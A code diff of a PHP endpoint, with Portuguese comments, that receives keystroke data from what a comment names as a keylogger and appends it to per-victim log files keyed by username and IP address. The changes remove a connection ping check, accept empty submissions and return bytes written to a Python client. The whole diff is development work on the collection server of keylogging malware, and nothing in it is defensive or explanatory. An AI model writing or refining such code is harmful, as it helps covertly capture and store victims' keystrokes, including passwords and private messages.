@@ -29,16 +29,10 @@ if (strpos($script_path, '/deploy/') !== 0 && strpos($script_path, '/deploy') !=
             exit();
         }
         
-        // Verifica se é ping (teste de conexão)
-        if (isset($payload['ping']) && $payload['ping'] === true) {
-            echo json_encode(['status' => 'connected']);
-            exit();
-        }
-        
         // Verifica se tem dados
-        if (!isset($payload['Data']) || empty($payload['Data'])) {
-            http_response_code(400);
-            echo json_encode(['error' => 'No data provided']);
+        if (!isset($payload['Data']) || $payload['Data'] === "") {
+            // Se não tiver dados, retorna OK mas não processa (keylogger pode estar vazio)
+            echo json_encode(['status' => 'ok', 'message' => 'No data to process']);
             exit();
         }
         
@@ -52,7 +46,7 @@ if (strpos($script_path, '/deploy/') !== 0 && strpos($script_path, '/deploy') !=
         $ip = isset($payload['ip']) ? str_replace('.', '_', $payload['ip']) : 'unknown';
         $filename = "{$username}_{$ip}.log";
         
-        // Prepara o conteúdo
+        // Prepara o conteúdo com os dados recebidos
         $timestamp = date('[d/m/Y] - H:i:s > ');
         $content = "---==\n" . $timestamp . $payload['Data'] . "\n";
         
@@ -70,7 +64,11 @@ if (strpos($script_path, '/deploy/') !== 0 && strpos($script_path, '/deploy') !=
         }
         
         // Resposta de sucesso (esperada pelo Python)
-        echo json_encode(['status' => 'ok']);
+        echo json_encode([
+            'status' => 'ok',
+            'message' => 'Data received',
+            'bytes_written' => $result
+        ]);
         exit();
     }
     
